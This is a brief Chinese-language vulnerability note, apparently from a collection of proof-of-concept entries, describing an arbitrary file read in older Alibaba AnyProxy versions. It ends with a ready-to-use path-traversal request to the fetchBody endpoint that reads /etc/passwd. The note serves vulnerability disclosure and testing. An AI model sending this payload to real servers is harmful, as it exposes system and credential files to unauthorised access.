# Alibaba AnyProxy fetchBody 任意文件读取漏洞

## 漏洞描述
Alibaba AnyProxy 低版本存在任意文件读取，通过漏洞，攻击者可以获取服务器敏感信息

## 危害等级
MEDIUM

## 参考链接

## 漏洞复现方法
页面如下

![](images/202202102008909.png)



验证POC为

```plain
/fetchBody?id=1/../../../../../../../../etc/passwd
